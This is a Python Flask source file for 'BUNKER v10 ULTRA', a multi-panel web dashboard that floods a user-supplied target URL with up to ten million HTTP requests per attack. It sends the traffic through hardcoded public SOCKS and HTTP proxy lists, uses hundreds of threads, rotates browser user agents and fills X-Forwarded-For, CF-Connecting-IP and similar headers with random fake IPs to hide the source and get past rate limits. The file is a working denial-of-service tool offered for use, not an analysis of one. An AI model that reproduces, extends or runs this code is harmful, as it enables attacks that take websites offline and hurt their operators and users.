from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
attack_counters = {}

# ⚡ PROXY POOLS
SOCKS5_PROXIES = [
    "94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080",
    "176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208",
    "162.253.68.97:4145","167.71.32.51:1080","23.176.40.194:1080",
    "173.212.239.43:1080","192.111.137.35:4145","38.170.157.77:1080",
]

SOCKS4_PROXIES = [
    "174.64.199.82:4145","68.71.241.33:4145","142.54.228.193:4145",
    "88.204.142.108:1080","192.252.220.92:4145","173.234.232.61:4145",
]

HTTP_PROXIES = [
    "51.89.14.70:80","51.79.50.149:80","50.174.7.154:80",
    "20.210.113.32:80","20.24.43.214:80","43.153.195.200:80",
]

custom_proxies = []
custom_proxy_enabled = True

def gen_fake_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

FAKE_IPS = [gen_fake_ip() for _ in range(50000)]

BROWSERS = [
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","Windows","Chrome"),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","macOS","Chrome"),
    ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","Linux","Chrome"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0","Windows","Firefox"),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0","macOS","Firefox"),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","macOS","Safari"),
    ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1","iOS","Safari"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0","Windows","Edge"),
    ("Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36","Android","Chrome"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0","Windows","Opera"),
]

def god_request(url, proxy_info=None):
    try:
        ua, os_name, browser = random.choice(BROWSERS)
        fake_ip = random.choice(FAKE_IPS)
        
        headers = {
            "User-Agent": ua,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "X-Client-IP": fake_ip,
            "CF-Connecting-IP": fake_ip,
            "True-Client-IP": fake_ip,
        }
        
        session = requests.Session()
        
        if proxy_info:
            ptype, paddr = proxy_info
            if ":" in paddr:
                host, port = paddr.split(":", 1)
                try:
                    port = int(port)
                    if ptype == "socks5":
                        session.proxies = {"http":f"socks5h://{host}:{port}","https":f"socks5h://{host}:{port}"}
                    elif ptype == "socks4":
                        session.proxies = {"http":f"socks4://{host}:{port}","https":f"socks4://{host}:{port}"}
                    else:
                        session.proxies = {"http":f"http://{host}:{port}","https":f"http://{host}:{port}"}
                except:
                    pass
        
        response = session.get(url, headers=headers, timeout=10, verify=False)
        return True
    except:
        return False

def build_proxy_list():
    all_proxies = []
    if custom_proxy_enabled:
        for p in SOCKS5_PROXIES: all_proxies.append(("socks5", p))
        for p in SOCKS4_PROXIES: all_proxies.append(("socks4", p))
        for p in HTTP_PROXIES: all_proxies.append(("http", p))
    for cp in custom_proxies:
        cp = cp.strip()
        if not cp: continue
        if cp.startswith("socks5://"): all_proxies.append(("socks5", cp[9:]))
        elif cp.startswith("socks4://"): all_proxies.append(("socks4", cp[9:]))
        elif cp.startswith("https://"): all_proxies.append(("http", cp[8:]))
        elif cp.startswith("http://"): all_proxies.append(("http", cp[7:]))
        elif ":" in cp: all_proxies.append(("socks5", cp))
    return all_proxies

def god_worker(attack_id, url, count, mode):
    all_proxies = build_proxy_list()
    success = 0
    fail = 0
    
    for i in range(count):
        if attack_id not in active_attacks:
            break
        
        proxy_info = random.choice(all_proxies) if all_proxies else None
        if mode == "direct": proxy_info = None
        
        if god_request(url, proxy_info):
            success += 1
            attack_stats["success"] += 1
        else:
            fail += 1
            attack_stats["failed"] += 1
        attack_stats["total"] += 1
        
        if attack_id in attack_counters:
            attack_counters[attack_id] = {"done": i+1, "total": count, "success": success, "fail": fail}

def run_attack(attack_id, url, count, speed, mode):
    workers_map = {"slow": 10, "fast": 30, "ultra": 80, "flash": 150, "god": 250}
    workers = workers_map.get(speed, 80)
    req_per_worker = max(1, count // workers)
    
    attack_logs.append(f"🔥 [{attack_id[:8]}] {url[:40]}... | {count} | {speed.upper()}")
    attack_counters[attack_id] = {"done": 0, "total": count, "success": 0, "fail": 0}
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(god_worker, attack_id, url, req_per_worker, mode) for _ in range(workers)]
        for future in as_completed(futures):
            try: future.result(timeout=600)
            except: pass
    
    if attack_id in active_attacks: del active_attacks[attack_id]

# ============================================
# 🎨 MULTI-PANEL UI
# ============================================
LOGIN = r"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BUNKER v10 ULTRA</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif}
.bg{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle,rgba(255,0,0,0.03) 1px,transparent 1px);background-size:30px 30px;animation:bg 15s linear infinite}
@keyframes bg{0%{transform:translate(0)}100%{transform:translate(30px,30px)}}
.box{background:rgba(10,0,0,0.97);padding:45px;border-radius:20px;border:3px solid rgba(255,0,0,0.6);width:400px;text-align:center;z-index:1;box-shadow:0 0 80px rgba(255,0,0,0.3);position:relative}
.box::before{content:'';position:absolute;top:-3px;left:-3px;right:-3px;bottom:-3px;border-radius:23px;background:linear-gradient(45deg,#f00,#ff0,#0f0,#f00);z-index:-1;animation:rot 2s linear infinite;opacity:0.4;filter:blur(10px)}
@keyframes rot{0%{filter:blur(10px) hue-rotate(0)}100%{filter:blur(10px) hue-rotate(360)}}
.logo{font-size:3.5em;animation:bounce 0.8s infinite}@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-12px)}}
h1{font-size:1.8em;font-weight:900;background:linear-gradient(180deg,#f00,#ff0,#0f0);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px}
.tag{color:#f44;font-size:0.7em;letter-spacing:4px;margin:8px 0}
input{width:100%;padding:14px;background:rgba(0,0,0,0.9);border:2px solid rgba(255,0,0,0.5);border-radius:10px;color:#f44;margin:8px 0;font-size:14px;font-family:monospace;transition:0.3s}
input:focus{border-color:#0f0;box-shadow:0 0 20px rgba(0,255,0,0.3);outline:none}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#c00,#f00);color:#fff;border:none;border-radius:10px;font-weight:800;cursor:pointer;font-size:15px;margin-top:10px;letter-spacing:2px;text-transform:uppercase;transition:0.3s}
.btn:hover{background:linear-gradient(135deg,#f00,#f44);box-shadow:0 0 40px rgba(255,0,0,0.6);transform:translateY(-2px)}
</style></head><body>
<div class="bg"></div>
<div class="box">
<div class="logo">💀</div>
<h1>BUNKER v10</h1>
<div class="tag">ULTRA • MULTI-PANEL</div>
<p style="color:#888;font-size:0.55em">20+ PANELS • INDIVIDUAL CONTROL • GLOBAL STOP</p>
<form method="post">
<input type="text" name="user" placeholder="🔑 USERNAME" autocomplete="off">
<input type="password" name="pass" placeholder="🔐 PASSWORD">
<button class="btn" type="submit">☠️ ACCESS</button>
</form>
{% if error %}<p style="color:#f00;margin-top:8px;font-size:0.8em">{{ error }}</p>{% endif %}
</div>
</body></html>"""

DASH = r"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BUNKER v10 ULTRA</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:8px}
.container{max-width:100%;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:15px 20px;border:3px solid rgba(255,0,0,0.5);border-radius:14px;margin-bottom:12px;background:rgba(10,0,0,0.97);flex-wrap:wrap;gap:10px}
.header h1{font-size:1.4em;font-weight:900;background:linear-gradient(180deg,#f00,#ff0,#0f0);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:2px}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:12px}
.stat{background:rgba(10,0,0,0.97);border:2px solid rgba(255,0,0,0.3);border-radius:10px;padding:14px;text-align:center}
.stat-val{font-size:1.8em;font-weight:900}.s{color:#0f0}.f{color:#f00}.t{color:#ff0}.a{color:#0ff}
.stat-label{font-size:0.5em;color:#888;text-transform:uppercase;letter-spacing:2px;margin-top:2px}
.multi-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(420px,1fr));gap:8px;margin-bottom:12px}
.panel{background:rgba(10,0,0,0.95);border:1px solid rgba(255,0,0,0.3);border-radius:10px;padding:12px;transition:0.3s}
.panel.active{border-color:#0f0;box-shadow:0 0 15px rgba(0,255,0,0.1)}
.panel-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
.panel-num{color:#ff0;font-weight:800;font-size:0.7em}
.panel-status{font-size:0.55em;padding:2px 7px;border-radius:8px;font-weight:600}
.status-ready{background:rgba(255,255,0,0.1);color:#ff0;border:1px solid rgba(255,255,0,0.3)}
.status-running{background:rgba(0,255,0,0.1);color:#0f0;border:1px solid rgba(0,255,0,0.3);animation:blink 0.8s infinite}
@keyframes blink{50%{opacity:0.3}}
.panel-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:4px;margin-bottom:4px}
.panel input,.panel select,.panel textarea{width:100%;padding:6px;background:#000;border:1px solid rgba(255,0,0,0.3);border-radius:5px;color:#f44;font-size:9px;font-family:monospace}
.panel textarea{resize:vertical;min-height:30px;font-size:8px}
.panel label{font-size:0.45em;color:#888;text-transform:uppercase;letter-spacing:1px;display:block;margin-top:3px}
.panel-btn{width:100%;padding:6px;background:linear-gradient(135deg,#c00,#f00);color:#fff;border:none;border-radius:5px;font-weight:700;cursor:pointer;font-size:0.55em;text-transform:uppercase;letter-spacing:1px;margin:2px 0;transition:0.3s}
.panel-btn:hover{background:#f00}
.panel-btn-stop{background:#222;color:#f00;border:1px solid #f00}
.panel-counter{font-size:0.5em;color:#ff0;text-align:center;margin-top:2px;font-family:monospace;min-height:12px}
.logs{background:#000;border:2px solid rgba(255,0,0,0.2);border-radius:8px;padding:10px;max-height:180px;overflow:auto;font-size:0.55em;font-family:monospace;color:#0f0;margin-top:8px}
.log-e{padding:2px 0;border-bottom:1px solid #111;color:#aaa}
.btn-add{width:100%;padding:10px;background:linear-gradient(135deg,#0a0,#0f0);color:#000;border:none;border-radius:8px;font-weight:800;cursor:pointer;font-size:0.7em;text-transform:uppercase;letter-spacing:2px;margin:8px 0}
.btn-master{width:100%;padding:12px;background:linear-gradient(135deg,#ff0,#f80);color:#000;border:none;border-radius:8px;font-weight:800;cursor:pointer;font-size:0.75em;text-transform:uppercase;letter-spacing:2px;margin:4px 0}
.btn-master-stop{background:#222;color:#f00;border:2px solid #f00}
.badge{display:inline-block;padding:4px 10px;border-radius:10px;font-size:0.5em;font-weight:800}
.badge-god{background:rgba(255,215,0,0.1);color:#ff0;border:2px solid rgba(255,215,0,0.4);animation:glow 0.8s infinite}
@keyframes glow{50%{box-shadow:0 0 20px rgba(255,215,0,0.4)}}
.toggle-row{display:flex;align-items:center;gap:6px;margin:6px 0;padding:8px;background:rgba(0,0,0,0.5);border-radius:8px;flex-wrap:wrap}
.toggle{width:36px;height:20px;background:#333;border-radius:10px;cursor:pointer;position:relative;transition:0.3s;flex-shrink:0}
.toggle.on{background:#0f0;box-shadow:0 0 10px rgba(0,255,0,0.3)}
.toggle::after{content:'';position:absolute;top:2px;left:2px;width:16px;height:16px;background:#fff;border-radius:50%;transition:0.3s}
.toggle.on::after{left:18px}
</style></head><body>
<div class="container">
<div class="header">
<div><h1>💀 BUNKER v10 ULTRA</h1><div style="color:#888;font-size:0.5em;letter-spacing:2px">MULTI-PANEL • INDIVIDUAL LAUNCH/STOP • GLOBAL CONTROL</div></div>
<div style="display:flex;gap:8px;align-items:center">
<span class="badge badge-god">⚡ ULTRA</span>
<a href="/logout" style="color:#f00;text-decoration:none;font-size:0.6em;font-weight:800">⏻ EXIT</a>
</div>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 TOTAL</div></div>
<div class="stat"><div class="stat-val a" id="activeCount">0</div><div class="stat-label">🔗 ACTIVE</div></div>
</div>

<div class="toggle-row">
<span style="font-size:0.6em;color:#fff;font-weight:600;white-space:nowrap">🔧 PROXY</span>
<div class="toggle on" id="proxyToggle" onclick="toggleProxy()"></div>
<span id="proxyLabel" style="font-size:0.6em;color:#0f0;font-weight:600;white-space:nowrap">ON</span>
<textarea id="globalProxies" placeholder="Global Proxies (one per line)" rows="1" style="flex:1;min-width:150px;padding:6px;background:#000;border:1px solid #f00;border-radius:5px;color:#f44;font-size:9px;font-family:monospace;resize:vertical"></textarea>
<button class="panel-btn" style="width:auto;padding:6px 12px;white-space:nowrap" onclick="saveGlobalProxies()">💾 SAVE</button>
</div>

<div class="multi-grid" id="panelGrid"></div>

<button class="btn-add" onclick="addPanel()">➕ ADD PANEL</button>

<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
<button class="btn-master" onclick="launchAll()">⚡ LAUNCH ALL</button>
<button class="btn-master btn-master-stop" onclick="stopAll()">⏹️ GLOBAL STOP</button>
</div>

<div class="card" style="margin-top:8px"><h3 style="color:#ff0;margin-bottom:6px;font-size:0.7em">📜 LOGS</h3><div class="logs" id="logs"><div class="log-e">💀 BUNKER v10 ULTRA READY</div><div class="log-e">🔗 Multi-Panel System Active</div></div></div>
</div>

<script>
var cpOn=true,lt=0,ltm=Date.now(),pc=0,intervals={};

function toggleProxy(){cpOn=!cpOn;document.getElementById('proxyToggle').classList.toggle('on',cpOn);var l=document.getElementById('proxyLabel');l.textContent=cpOn?'ON':'OFF';l.style.color=cpOn?'#0f0':'#f00';fetch('/toggle_proxy',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:cpOn})})}

function saveGlobalProxies(){
var p=document.getElementById('globalProxies').value;
fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:p})}).then(r=>r.json()).then(d=>{alert('✅ '+d.count+' Proxies Saved!')})}

function CP(n){
return `<div class="panel" id="p${n}">
<div class="panel-header"><span class="panel-num">🎯 PANEL #${n}</span><span class="panel-status status-ready" id="s${n}">READY</span></div>
<div class="panel-row"><div><label>URL</label><input type="text" id="u${n}" placeholder="https://target.com"></div><div><label>REQ</label><input type="number" id="c${n}" value="10000"></div><div><label>SPEED</label><select id="sp${n}"><option value="slow">Slow</option><option value="fast">Fast</option><option value="ultra" selected>ULTRA</option><option value="flash">FLASH</option><option value="god">GOD</option></select></div></div>
<div class="panel-row"><div><label>MODE</label><select id="m${n}"><option value="direct">DIRECT</option><option value="socks5">SOCKS5</option><option value="socks4">SOCKS4</option><option value="http">HTTP</option><option value="mixed">MIXED</option><option value="all" selected>ALL</option></select></div><div><label>PROXIES</label><textarea id="pr${n}" rows="1" placeholder="socks5://ip:port"></textarea></div></div>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:3px"><button class="panel-btn" onclick="LP(${n})">⚡ LAUNCH</button><button class="panel-btn panel-btn-stop" onclick="SP(${n})">⏹️ STOP</button></div>
<div class="panel-counter" id="cnt${n}">READY</div></div>`}

function addPanel(){pc++;document.getElementById('panelGrid').insertAdjacentHTML('beforeend',CP(pc))}

function LP(n){
var u=document.getElementById('u'+n).value,c=document.getElementById('c'+n).value,sp=document.getElementById('sp'+n).value,m=document.getElementById('m'+n).value,pr=document.getElementById('pr'+n).value;
if(!u){alert('Panel #'+n+': Enter URL!');return}
fetch('/save_panel_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:pr})});
fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:u,count:parseInt(c),speed:sp,mode:m,panel:n})}).then(r=>r.json()).then(d=>{
document.getElementById('s'+n).textContent='RUNNING';document.getElementById('s'+n).className='panel-status status-running';
document.getElementById('p'+n).classList.add('active');
if(intervals[n])clearInterval(intervals[n]);intervals[n]=setInterval(function(){UC(n)},200);l();u()})}

function SP(n){fetch('/stop_panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({panel:n})}).then(()=>{RP(n);l()})}

function RP(n){document.getElementById('s'+n).textContent='STOPPED';document.getElementById('s'+n).className='panel-status status-ready';document.getElementById('p'+n).classList.remove('active');document.getElementById('cnt'+n).textContent='STOPPED';if(intervals[n]){clearInterval(intervals[n]);delete intervals[n]}}

function launchAll(){var ps=document.querySelectorAll('.panel');ps.forEach(function(p){var n=p.id.replace('p','');var u=document.getElementById('u'+n)?.value;if(u)LP(parseInt(n))})}

function stopAll(){if(!confirm('⚠️ STOP ALL?'))return;fetch('/stop_all',{method:'POST'}).then(()=>{document.querySelectorAll('.panel').forEach(function(p){var n=p.id.replace('p','');RP(n)});l();u()})}

function UC(n){fetch('/counter?panel='+n).then(r=>r.json()).then(d=>{if(d.active){document.getElementById('cnt'+n).textContent='⚡ '+d.done+'/'+d.total+' [✅'+d.success+']'}else{document.getElementById('cnt'+n).textContent='DONE';RP(n)}})}

function u(){fetch('/stats').then(r=>r.json()).then(d=>{
document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;
document.getElementById('total').textContent=d.total;document.getElementById('activeCount').textContent=d.active||0;
var n=Date.now(),dt=n-ltm;if(dt>0){lt=d.total;ltm=n;}})}

function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}

for(var i=0;i<3;i++)addPanel();
setInterval(function(){l();u()},1000)
</script></body></html>"""

# ============================================
# ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="⛔ ACCESS DENIED")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return DASH

@app.route('/toggle_proxy', methods=['POST'])
def toggle_proxy():
    global custom_proxy_enabled
    d = request.get_json()
    custom_proxy_enabled = d.get('enabled', True)
    return jsonify({"status":"ok"})

@app.route('/save_proxies', methods=['POST'])
def save_proxies():
    global custom_proxies
    d = request.get_json()
    raw = d.get('proxies', '')
    custom_proxies = []
    lines = raw.replace('\r\n','\n').replace('\r','\n').split('\n')
    for line in lines:
        line = line.strip()
        if not line: continue
        if ' ' in line:
            found = re.findall(r'(?:socks[45]|https?)://[^\s]+:\d+', line)
            if found: custom_proxies.extend(found)
            else:
                for part in line.split():
                    part = part.strip().rstrip(',;')
                    if ':' in part and len(part) > 8: custom_proxies.append(part)
        else:
            line = line.rstrip(',;')
            if ':' in line and len(line) > 8: custom_proxies.append(line)
    seen = set()
    unique = []
    for p in custom_proxies:
        if p not in seen: seen.add(p); unique.append(p)
    custom_proxies = unique
    attack_logs.append(f"💾 {len(custom_proxies)} proxies saved")
    return jsonify({"status":"ok","count":len(custom_proxies)})

@app.route('/save_panel_proxies', methods=['POST'])
def save_panel_proxies():
    return jsonify({"status":"ok"})

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    url = d.get('url','')
    count = min(int(d.get('count',1000)),10000000)
    speed = d.get('speed','ultra')
    mode = d.get('mode','all')
    panel = d.get('panel',0)
    if not url: return jsonify({"error":"URL required"}),400
    
    # Stop existing for this panel
    for k in list(active_attacks.keys()):
        if k.startswith(f"p{panel}_"): del active_attacks[k]
    
    aid = f"p{panel}_{int(time.time())}"
    active_attacks[aid] = True
    
    t = threading.Thread(target=run_attack, args=(aid,url,count,speed,mode))
    t.daemon=True; t.start()
    return jsonify({"status":"started","panel":panel})

@app.route('/stop_panel', methods=['POST'])
def stop_panel():
    d = request.get_json()
    panel = d.get('panel',0)
    for k in list(active_attacks.keys()):
        if k.startswith(f"p{panel}_"): del active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/stop_all', methods=['POST'])
def stop_all():
    c = len(active_attacks)
    for k in list(active_attacks.keys()): del active_attacks[k]
    attack_logs.append(f"⏹️ GLOBAL STOP: {c} attacks")
    return jsonify({"status":"all_stopped"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/counter')
def counter():
    panel = request.args.get('panel','0')
    for aid in active_attacks:
        if aid.startswith(f"p{panel}_") and aid in attack_counters:
            return jsonify({"active":True,**attack_counters[aid]})
    return jsonify({"active":False})

@app.route('/logs')
def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats(): return jsonify({**attack_stats,"active":len(active_attacks)})

@app.route('/logout')
def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    print("💀 BUNKER v10 ULTRA - MULTI-PANEL")
    print("🔗 20+ Panels | Individual Control | Global Stop")
    import os
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
